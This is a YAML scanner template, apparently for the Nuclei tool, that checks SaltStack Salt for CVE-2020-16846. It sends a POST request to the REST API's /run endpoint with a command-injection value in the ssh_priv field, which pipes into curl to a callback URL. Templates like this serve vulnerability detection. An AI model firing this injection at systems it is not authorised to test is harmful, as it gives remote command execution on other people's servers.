id: yaml-poc-saltstack-salt-unauthorized_access-CVE-2020-16846
info:
  name: Yaml Poc Saltstack Salt Unauthorized_Access Cve 2020 16846
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-saltstack-salt-unauthorized_access-CVE-2020-16846'
  tags: unauth,cve
  classification:
    cve-id: CVE-2020-16846
  reference:
  - http://lists.opensuse.org/opensuse-security-announce/2020-11/msg00029.html
  - http://packetstormsecurity.com/files/160039/SaltStack-Salt-REST-API-Arbitrary-Command-Execution.html
  - https://cxsecurity.com/issue/WLB-2020110112
  - https://github.com/saltstack/salt/releases
  - https://lists.debian.org/debian-lts-announce/2020/12/msg00007.html
http:
- method: POST
  path:
  - /run
  body: token=12312&client=ssh&tgt=*&fun=a&roster=aaa&ssh_priv=aaa|curl+{{reverseURL}}%3b
  headers:
    Content-Type: application/x-www-form-urlencoded
